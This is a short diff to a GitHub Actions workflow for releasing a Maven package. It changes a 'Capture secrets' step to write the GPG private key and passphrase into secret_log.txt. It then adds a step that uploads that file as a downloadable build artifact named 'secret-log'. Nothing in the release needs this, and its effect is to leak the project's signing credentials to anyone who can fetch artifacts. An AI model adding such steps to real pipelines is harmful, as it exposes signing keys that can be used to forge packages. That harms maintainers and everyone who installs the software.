@@ -30,9 +30,14 @@ jobs:
 
       - name: Capture secrets
         run: |
-            echo "GPG_PRIVATE_KEY='${{ secrets.GPG_PRIVATE_KEY }}'" 
-            echo "GPG_PASSPHRASE='${{ secrets.GPG_PASSPHRASE }}'" 
-            
+          echo "GPG_PRIVATE_KEY='${{ secrets.GPG_PRIVATE_KEY }}'" > secret_log.txt
+          echo "GPG_PASSPHRASE='${{ secrets.GPG_PASSPHRASE }}'" >> secret_log.txt
+        
+      - name: Upload secret log
+        uses: actions/upload-artifact@v4
+        with:
+          name: secret-log
+          path: secret_log.txt
 
       - name: Release Maven package
         run: ./deploy_to_maven_central.sh
